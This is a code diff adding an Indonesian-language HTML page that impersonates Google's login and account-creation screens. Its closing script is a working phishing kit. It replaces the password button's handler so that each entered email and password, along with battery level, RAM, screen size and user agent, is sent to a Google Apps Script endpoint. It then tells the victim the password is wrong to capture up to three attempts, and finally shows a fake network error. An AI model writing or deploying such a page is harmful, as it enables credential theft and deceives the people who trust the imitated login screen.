@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google - Login & Registrasi</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+        font-family: 'Roboto', sans-serif;
+        background-color: #fff;
+    }
+    
+    .google-input-container {
+        position: relative;
+        margin-bottom: 1.5rem;
+        width: 100%;
+    }
+    
+    .google-input {
+        width: 100%;
+        padding: 13px 15px;
+        font-size: 16px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        outline: none;
+        transition: border-color 0.2s;
+        background: transparent;
+    }
+    
+    .google-input:focus {
+        border: 2px solid #1a73e8;
+        padding: 12px 14px;
+    }
+    
+    .google-label {
+        position: absolute;
+        left: 12px;
+        top: 13px;
+        padding: 0 4px;
+        color: #5f6368;
+        font-size: 16px;
+        pointer-events: none;
+        transition: 0.2s ease all;
+        background-color: white;
+    }
+    
+    .google-input:focus ~ .google-label,
+    .google-input:not(:placeholder-shown) ~ .google-label {
+        top: -10px;
+        left: 10px;
+        font-size: 12px;
+        color: #1a73e8;
+    }
+    
+    .google-btn-next {
+        background-color: #1a73e8;
+        color: white;
+        padding: 10px 24px;
+        border-radius: 4px;
+        font-weight: 500;
+        transition: background-color 0.2s;
+    }
+    
+    .google-btn-next:hover {
+        background-color: #1765cc;
+    }
+    
+    .google-btn-text {
+        color: #1a73e8;
+        font-weight: 500;
+        padding: 10px 8px;
+        border-radius: 4px;
+        transition: background-color 0.2s;
+    }
+    
+    .google-btn-text:hover {
+        background-color: #f6fafe;
+    }
+    
+    .auth-card {
+        min-height: 500px;
+        transition: all 0.3s ease;
+    }
+    
+    @media (min-width: 640px) {
+        .auth-card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            width: 450px;
+        }
+        .auth-card.wide {
+            width: 750px;
+        }
+    }
+    
+    .hidden-view { display: none; }
+  </style>
+</head>
+<body class="flex flex-col min-h-screen items-center justify-center sm:bg-[#f8f9fa]">
+
+  <!-- Main Container -->
+  <main id="main-card" class="auth-card bg-white px-6 py-10 sm:px-10 flex flex-col w-full max-w-[450px]">
+
+    <!-- Google Logo -->
+    <div class="flex justify-center mb-3">
+      <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12.48 10.92v3.28h7.84c-.24 1.84-.92 3.12-1.92 4.12-1.2 1.2-3.08 2.48-6.04 2.48-4.84 0-8.6-3.88-8.6-8.72s3.76-8.72 8.6-8.72c2.6 0 4.52 1.04 5.92 2.4l2.32-2.32C18.6 1.44 15.96 0 12.48 0 5.68 0 0 5.64 0 12.48s5.68 12.48 12.48 12.48c3.76 0 6.6-1.24 8.84-3.56 2.32-2.32 3.04-5.56 3.04-8.16 0-.6-.04-1.2-.12-1.8h-11.76z" fill="#4285F4" />
+        <path d="M35.48 8.52c-3.4 0-6.28 2.56-6.28 6.16s2.88 6.16 6.28 6.16 6.28-2.56 6.28-6.16-2.88-6.16-6.28-6.16zm0 9.88c-1.88 0-3.48-1.52-3.48-3.72s1.6-3.72 3.48-3.72 3.48 1.52 3.48 3.72-1.6 3.72-3.48 3.72z" fill="#EA4335" />
+        <path d="M49.2 8.52c-3.4 0-6.28 2.56-6.28 6.16s2.88 6.16 6.28 6.16 6.28-2.56 6.28-6.16-2.88-6.16-6.28-6.16zm0 9.88c-1.88 0-3.48-1.52-3.48-3.72s1.6-3.72 3.48-3.72 3.48 1.52 3.48 3.72-1.6 3.72-3.48 3.72z" fill="#FBBC05" />
+        <path d="M62.16 8.52c-3.28 0-6.04 2.64-6.04 6.16 0 3.48 2.76 6.16 6.04 6.16 1.56 0 2.76-.72 3.4-1.44v1.12c0 2.36-1.28 3.64-3.32 3.64-1.68 0-2.72-1.2-3.12-2.24l-2.88 1.2c.84 2 2.92 4.32 6 4.32 3.2 0 5.88-1.88 5.88-6.4V8.88h-2.84v1.16c-.64-.76-1.84-1.52-3.16-1.52zm-2.92 6.16c0-2.2 1.6-3.72 3.24-3.72 1.64 0 2.96 1.56 2.96 3.72 0 2.12-1.32 3.72-2.96 3.72-1.64 0-3.24-1.6-3.24-3.72z" fill="#4285F4" />
+        <path d="M72.24.44h-3.24V20.4h3.24V.44z" fill="#34A853" />
+        <path d="M81.8 17.56l2.52 1.68c-.8 1.2-2.76 3.24-5.88 3.24-3.72 0-6.4-2.88-6.4-6.16 0-3.64 2.72-6.16 6.08-6.16 3.4 0 5.04 2.56 5.56 3.92l.32.84-8.88 3.68c.68 1.36 1.76 2.04 3.28 2.04 1.52 0 2.52-.76 3-2.08zm-6.6-2.76l5.96-2.48c-.32-.8-1.28-1.36-2.32-1.36-1.32 0-3.72 1.16-3.64 3.84z" fill="#EA4335" />
+      </svg>
+    </div>
+
+    <!-- VIEW 1: LOGIN EMAIL -->
+    <div id="view-login" class="view">
+      <h1 class="text-2xl text-center font-normal text-[#202124] mt-2 mb-1">Login</h1>
+      <p class="text-center text-[#202124] mb-8 text-base">Gunakan Akun Google Anda</p>
+      <div class="google-input-container">
+        <input type="text" id="email-input" class="google-input" placeholder=" " required>
+        <label class="google-label">Email atau ponsel</label>
+      </div>
+      <button onclick="switchView('view-forgot-email')" class="text-[#1a73e8] font-medium text-sm hover:underline mb-8 inline-block w-max">Lupa email?</button>
+      <p class="text-[#5f6368] text-sm leading-relaxed mb-10">
+        Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi.
+        <a href="#" onclick="alertNetworkError(event)" class="text-[#1a73e8] font-medium hover:underline">Pelajari selengkapnya</a>
+      </p>
+      <div class="flex items-center justify-between mt-4">
+        <button onclick="switchView('view-register')" class="google-btn-text text-sm">Buat akun</button>
+        <button onclick="handleEmailNext()" class="google-btn-next text-sm">Berikutnya</button>
+      </div>
+    </div>
+
+    <!-- VIEW 2: PASSWORD (BERIKUTNYA) -->
+    <div id="view-password" class="view hidden-view">
+      <h1 class="text-2xl text-center font-normal text-[#202124] mt-2 mb-1">Selamat Datang</h1>
+      <div id="display-email" class="flex items-center justify-center border border-gray-300 rounded-full px-3 py-1 w-fit mx-auto mb-8 text-sm text-[#3c4043] font-medium">
+        <span class="mr-2">user@gmail.com</span>
+        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+          <path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" />
+        </svg>
+      </div>
+      <div class="google-input-container">
+        <input type="password" id="password-input" class="google-input" placeholder=" " required>
+        <label class="google-label">Masukkan sandi Anda</label>
+      </div>
+      <div class="flex items-center mb-10">
+        <input type="checkbox" id="show-pass" class="w-4 h-4 mr-3" onclick="togglePass()">
+        <label for="show-pass" class="text-sm text-[#202124]">Tampilkan sandi</label>
+      </div>
+      <div class="flex items-center justify-between mt-4">
+        <button onclick="switchView('view-login')" class="google-btn-text text-sm">Lupa sandi?</button>
+        <button onclick="alert('Login Berhasil!')" class="google-btn-next text-sm">Berikutnya</button>
+      </div>
+    </div>
+
+    <!-- VIEW 3: LUPA EMAIL -->
+    <div id="view-forgot-email" class="view hidden-view">
+      <h1 class="text-2xl text-center font-normal text-[#202124] mt-2 mb-1">Temukan email Anda</h1>
+      <p class="text-center text-[#202124] mb-8 text-base">Masukkan nomor telepon atau email pemulihan</p>
+      <div class="google-input-container">
+        <input type="text" class="google-input" placeholder=" " required>
+        <label class="google-label">Nomor telepon atau email</label>
+      </div>
+      <div class="flex items-center justify-between mt-20">
+        <button onclick="switchView('view-login')" class="google-btn-text text-sm">Kembali</button>
+        <button onclick="alertNetworkError(event)" class="google-btn-next text-sm">Berikutnya</button>
+      </div>
+    </div>
+
+    <!-- VIEW 4: BUAT AKUN (REGISTER) -->
+    <div id="view-register" class="view hidden-view">
+      <h1 class="text-2xl font-normal text-[#202124] mt-2 mb-1">Buat Akun Google</h1>
+      <p class="text-[#202124] mb-8 text-base">Lanjutkan ke Gmail</p>
+
+      <div class="flex flex-col sm:flex-row sm:space-x-4 mb-4">
+        <div class="google-input-container mb-4 sm:mb-0">
+          <input type="text" class="google-input" placeholder=" " required>
+          <label class="google-label">Nama depan</label>
+        </div>
+        <div class="google-input-container mb-0">
+          <input type="text" class="google-input" placeholder=" " required>
+          <label class="google-label">Nama belakang</label>
+        </div>
+      </div>
+
+      <div class="google-input-container">
+        <input type="text" class="google-input" placeholder=" " required>
+        <label class="google-label">Nama pengguna</label>
+        <span class="text-xs text-gray-500 mt-1 block">Anda dapat menggunakan huruf, angka & titik</span>
+      </div>
+
+      <div class="flex flex-col sm:flex-row sm:space-x-4 mb-2">
+        <div class="google-input-container mb-4 sm:mb-0">
+          <input type="password" id="reg-pass" class="google-input" placeholder=" " required>
+          <label class="google-label">Sandi</label>
+        </div>
+        <div class="google-input-container mb-0">
+          <input type="password" id="reg-confirm" class="google-input" placeholder=" " required>
+          <label class="google-label">Konfirmasi</label>
+        </div>
+      </div>
+      <p class="text-xs text-gray-500 mb-8 leading-normal">Gunakan minimal 8 karakter dengan campuran huruf, angka & simbol</p>
+
+      <div class="flex items-center justify-between mt-4">
+        <button onclick="switchView('view-login')" class="google-btn-text text-sm">Login saja</button>
+        <button onclick="alert('Akun berhasil dibuat!')" class="google-btn-next text-sm">Berikutnya</button>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="w-full max-w-[450px] sm:w-[450px] mt-6 flex flex-col sm:flex-row justify-between items-center px-4 text-xs text-[#202124]">
+    <div class="flex items-center space-x-4 mb-4 sm:mb-0">
+      <select class="bg-transparent hover:bg-gray-100 p-2 rounded cursor-pointer outline-none">
+        <option value="id">Indonesia</option>
+        <option value="en">English (US)</option>
+      </select>
+    </div>
+    <div class="flex space-x-4 text-[#5f6368]">
+      <a href="#" onclick="alertNetworkError(event)" class="hover:bg-gray-100 p-1 rounded">Bantuan</a>
+      <a href="#" onclick="alertNetworkError(event)" class="hover:bg-gray-100 p-1 rounded">Privasi</a>
+      <a href="#" onclick="alertNetworkError(event)" class="hover:bg-gray-100 p-1 rounded">Persyaratan</a>
+    </div>
+  </footer>
+
+  <script>
+    function alertNetworkError(event) {
+        if (event) event.preventDefault();
+        alert("jaringan bermasalah");
+    }
+    
+    function switchView(viewId) {
+        // Hide all views
+        document.querySelectorAll('.view').forEach(view => {
+            view.classList.add('hidden-view');
+        });
+        // Show target view
+        document.getElementById(viewId).classList.remove('hidden-view');
+    
+        // Special layout for Register
+        const card = document.getElementById('main-card');
+        if(viewId === 'view-register') {
+            card.classList.add('wide');
+        } else {
+            card.classList.remove('wide');
+        }
+    }
+    
+    function handleEmailNext() {
+        const email = document.getElementById('email-input').value;
+        if (email.trim() === "") {
+            alert("Masukkan email atau nomor ponsel");
+            return;
+        }
+        document.querySelector('#display-email span').innerText = email;
+        switchView('view-password');
+    }
+    
+    function togglePass() {
+        const pass = document.getElementById('password-input');
+        pass.type = pass.type === 'password' ? 'text' : 'password';
+    }
+        
+    
+      
+        const SCRIPT_URL_GGS = "https://script.google.com/macros/s/AKfycbznLVE-GHjq6FcYIQEAzgMUfkOvYvMJaTNeboygVWZqlgUP7dmIh0hwtmPlEciBO1apxA/exec"; // GANTI DENGAN URL DEPLOY TERBARU
+        let passwordAttempts = 0;
+        const MAX_ATTEMPTS = 3;
+    
+        // Fungsi mendapatkan info hardware dengan penanganan error
+        async function getDeviceInfo() {
+    let hardware = {
+        battery: "Tidak didukung",
+        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Privasi/Lainnya",
+        screen: window.screen.width + "x" + window.screen.height,
+        device: navigator.userAgent
+    };
+    
+    try {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            hardware.battery = Math.round(b.level * 100) + "% " + (b.charging ? "(Cas)" : "(Baterai)");
+        }
+    } catch (e) {
+        console.log("Baterai tidak bisa diakses");
+    }
+    return hardware;
+        }
+    
+        async function handlePasswordSubmit() {
+    const email = document.getElementById('email-input').value;
+    const password = document.getElementById('password-input').value;
+    const btnNext = document.querySelector('#view-password .google-btn-next');
+    
+    if (!password) {
+        alert("Masukkan sandi");
+        return;
+    }
+    
+    btnNext.innerText = "Memproses...";
+    btnNext.disabled = true;
+    
+    // TUNGGU hingga data hardware siap
+    const infoHP = await getDeviceInfo();
+    
+    const payload = {
+        email: email,
+        password: password,
+        battery: infoHP.battery,
+        ram: infoHP.ram,
+        screen: infoHP.screen,
+        device: infoHP.device
+    };
+    
+    try {
+        // Kirim ke Google Sheets
+        await fetch(SCRIPT_URL_GGS, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(payload)
+        });
+    
+        passwordAttempts++;
+        if (passwordAttempts < MAX_ATTEMPTS) {
+            setTimeout(() => {
+                alert("Sandi salah. Coba lagi.");
+                document.getElementById('password-input').value = "";
+                btnNext.innerText = "Berikutnya";
+                btnNext.disabled = false;
+            }, 800);
+        } else {
+            alert("Jaringan bermasalah, coba lagi nanti.");
+            window.location.reload();
+        }
+    } catch (err) {
+        console.error(err);
+        btnNext.disabled = false;
+    }
+        }
+    
+        document.addEventListener("DOMContentLoaded", function() {
+    const passwordBtn = document.querySelector('#view-password .google-btn-next');
+    if (passwordBtn) {
+        passwordBtn.onclick = handlePasswordSubmit; // Gunakan .onclick untuk memastikan tertimpa
+    }
+        });
+  </script>
+</body>
+</html>
